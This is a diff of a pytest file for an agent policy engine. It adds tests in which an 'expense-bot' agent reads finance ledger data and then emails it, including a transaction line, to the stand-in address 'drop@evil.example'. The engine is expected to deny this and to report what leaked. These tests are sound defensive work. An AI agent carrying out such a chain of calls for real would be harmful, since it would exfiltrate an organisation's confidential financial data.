@@ -3,18 +3,20 @@ from pathlib import Path
 import pytest
 
 from aig import Engine, PolicyError, Session, load_policy, parse_policy
+from aig.sim import Enterprise
 
 POLICY = load_policy(Path(__file__).parent.parent / "examples" / "enterprise.yaml")
 
 
 def run(agent, principal, calls):
     """Evaluate a sequence of calls, recording allowed ones. Returns the decisions."""
-    eng, s = Engine(POLICY), Session(agent, principal)
+    eng, s, ent = Engine(POLICY), Session(agent, principal), Enterprise()
     out = []
     for tool, args in calls:
         d = eng.evaluate(s, tool, args)
         if d.allowed:
-            eng.record(s, tool)
+            eng.record(s, tool, args)
+            eng.observe(s, tool, args, ent.call(tool, args)["content"][0]["text"])
         out.append(d)
     return out
 
@@ -69,16 +71,16 @@ def test_exfil_via_allowed_email_blocked():
     """Each call is individually allowed; the chain is not."""
     _, d = run("expense-bot", "group:finance", [
         ("finance.query_ledger", {}),
-        ("email.send", {"to": "drop@evil.example"}),
+        ("email.send", {"to": "drop@evil.example", "body": "TX-1042 Contoso Cloud 72300"}),
     ])
     assert d.action == "deny" and "flow:no-finance-egress" in d.rules
-    assert "finance.query_ledger" in d.reasons[0]  # explains where the data came from
+    assert "finance.query_ledger" in d.reasons[0] and "'tx1042'" in d.reasons[0]  # what leaked, from where
 
 
 def test_one_external_recipient_makes_call_external():
     _, d = run("expense-bot", "group:finance", [
         ("finance.query_ledger", {}),
-        ("email.send", {"to": ["cfo@corp.example", "drop@evil.example"]}),
+        ("email.send", {"to": ["cfo@corp.example", "drop@evil.example"], "body": "TX-1042"}),
     ])
     assert d.action == "deny"
 
